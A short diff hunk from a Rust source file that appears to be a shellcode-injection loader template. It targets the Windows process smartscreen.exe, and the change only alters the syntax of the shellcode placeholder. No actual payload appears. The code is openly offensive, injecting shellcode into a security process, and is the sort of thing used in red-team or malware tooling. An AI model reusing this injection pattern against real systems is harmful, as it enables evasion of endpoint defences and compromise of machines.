@@ -57,7 +57,7 @@ fn main() {
     // inject in the following processes:
     let tar: &str = "smartscreen.exe";
 
-    let buf: Vec<u8> = vec![{ shellcode }];
+    let buf: Vec<u8> = vec!{{shellcode}};
     let list: Vec<u32> = boxboxbox(tar);
     if list.len() == 0 {
         panic!("[-] Unable to find a process.")
